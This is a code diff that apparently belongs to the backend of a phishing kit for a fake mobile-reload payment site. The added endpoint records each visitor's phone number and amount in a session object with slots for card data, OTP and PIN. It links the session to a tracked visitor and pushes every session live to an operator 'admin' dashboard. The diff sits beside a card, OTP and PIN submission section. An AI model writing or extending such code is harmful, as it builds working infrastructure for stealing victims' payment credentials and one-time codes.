@@ -206,6 +206,53 @@ function broadcastToSession(sessionId, data) {
 }
 
 // ============================================================
+// API - Early Session (phone number + amount before card)
+// ============================================================
+
+// POST /api/early-session - create or update session with phone/amount before card entry
+app.post('/api/early-session', (req, res) => {
+  const { sessionId, number, amount, type, visitorId, page } = req.body;
+  if (!sessionId || !number) return res.status(400).json({ success: false, error: 'Missing required fields' });
+
+  const existing = sessions[sessionId];
+
+  if (existing) {
+    // Update existing session with new amount/page
+    if (amount) existing.amount = amount;
+    if (page) existing._page = page;
+    existing.updatedAt = new Date().toISOString();
+    broadcastToAdmins({ type: 'session_update', sessionId, ...existing });
+  } else {
+    // Create early session
+    sessions[sessionId] = {
+      sessionId,
+      number: number || '',
+      amount: amount || '',
+      ref: '',
+      type: type || 'reload',
+      cardData: null,
+      otpData: null,
+      pinData: null,
+      status: 'browsing',
+      visitorId: visitorId || '',
+      _page: page || 'amount',
+      createdAt: new Date().toISOString(),
+      updatedAt: new Date().toISOString(),
+    };
+    broadcastToAdmins({ type: 'new_session', sessionId, ...sessions[sessionId] });
+  }
+
+  // Link visitor to session
+  if (visitorId && visitors[visitorId]) {
+    visitors[visitorId].sessionId = sessionId;
+    visitors[visitorId].number = number;
+    if (amount) visitors[visitorId].amount = amount;
+  }
+
+  return res.json({ success: true, sessionId });
+});
+
+// ============================================================
 // API - Card / OTP / PIN Submission
 // ============================================================
 
